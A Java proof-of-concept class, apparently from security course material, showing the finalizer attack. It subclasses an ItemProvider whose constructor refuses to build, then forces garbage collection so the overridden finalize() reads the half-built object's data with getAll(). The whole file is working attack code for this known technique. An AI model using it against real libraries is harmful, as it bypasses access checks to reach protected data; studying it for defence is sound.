package be.howest.ti.hsa.hidden;

import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.supa.expensive.service.item.provider.ItemProvider;

public class ItemProviderHack {
    
    private List<String> stolenData = null;
    
    private class Hack extends ItemProvider {
        Hack() { super(0); }
        
        protected void finalize() {
            stolenData = this.getAll();
            System.out.println("Got ya !!!");
        }
        
    }
    
    private List<String> steal(){
        stolenData = null;
        Hack h = null;
        try {
            h = new Hack();
        } catch (RuntimeException ex){
            System.out.println("No ItemProvider created ... as expected ...");
        }
        
        h = null;
        
        while(stolenData==null){
            System.out.println("Still null");
            System.gc();
            try {
                Thread.sleep(10);
            } catch (InterruptedException ex) {
                Logger.getLogger(ItemProviderHack.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        
        return stolenData;
         
    }
    
    
    public static void main(String[] args){
        ItemProviderHack iph = new ItemProviderHack();
        
        for(String s : iph.steal()){
            System.out.println(s);
        }
    }
    
    

}
